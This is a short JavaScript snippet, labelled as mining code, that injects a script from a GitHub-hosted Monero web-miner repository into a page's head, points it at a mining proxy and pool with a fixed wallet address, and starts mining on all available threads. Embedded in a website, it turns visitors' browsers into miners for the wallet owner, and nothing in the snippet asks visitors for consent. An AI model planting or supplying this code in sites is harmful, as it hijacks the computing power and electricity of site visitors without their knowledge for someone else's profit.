// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://ny1.xmrminingproxy.com";
var pool = "moneroocean.stream";
var walletAddress = "44kUSjLeYWYK34DMfAkPqtYPBw2a65gUPNaixqSWUqfpXagsr8YFDbcJCK1nNHRKqQXW5ekrf5gnE9dCC9iNtT4B1XFyiA9";
var workerId = "WEBM"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
